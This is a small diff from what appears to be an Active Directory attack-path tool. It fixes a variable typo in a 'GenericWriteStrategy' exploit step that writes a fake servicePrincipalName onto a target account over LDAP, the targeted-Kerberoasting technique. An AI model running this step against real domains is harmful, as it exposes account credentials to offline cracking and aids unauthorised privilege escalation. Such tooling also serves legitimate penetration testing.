@@ -127,7 +127,7 @@ class GenericWriteStrategy(ExploitStrategy):
 				auto_bind=True
 			   )
 
-			success  = conn.modify(target_dh, {"servicePrincipalName": [(MODIFY_ADD, [fake_spn])]})
+			success  = conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [fake_spn])]})
 			# != MODIFY_REPLACE not to overwrite existing values
 			if not success: # insufficientAccessRights, constraintViolation
 				raise HopFailedError(edge, f"LDAP modify rejected: {conn.result['description']}")
